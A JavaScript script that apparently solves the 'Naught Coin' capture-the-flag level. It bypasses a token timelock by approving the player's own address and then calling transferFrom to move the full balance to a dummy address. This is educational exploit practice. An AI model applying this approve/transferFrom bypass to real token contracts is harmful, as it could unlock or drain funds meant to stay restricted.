const {
    NAUGHT_COIN_INSTANCE_ADDRESS,
    logStartingLevel,
    logSuccessfullyLevel,
    logInstanceAddressIsNull,
    logInstanceAddress,
    logTransactionLink
} = require('./utils');

// you can get any address on chain
const randomAddress = '0x0000000000000000000000000000000000000001';

async function main(levelName) {
    logStartingLevel(levelName);

    if (!NAUGHT_COIN_INSTANCE_ADDRESS) {
        logInstanceAddressIsNull(levelName);
        return;
    }
    logInstanceAddress(levelName, NAUGHT_COIN_INSTANCE_ADDRESS);

    const [attacker] = await ethers.getSigners();
    const factory = await ethers.getContractFactory("NaughtCoin");
    const contract = factory.attach(NAUGHT_COIN_INSTANCE_ADDRESS);
    const tokens = ethers.BigNumber.from(10).pow(18).mul(1000000);

    let tx = await contract.approve(attacker.address, tokens);
    logTransactionLink(tx.hash);
    await tx.wait(1);

    tx = await contract.transferFrom(attacker.address, randomAddress, tokens);
    logTransactionLink(tx.hash);
    await tx.wait(1);

    logSuccessfullyLevel(levelName);
}

module.exports = main;
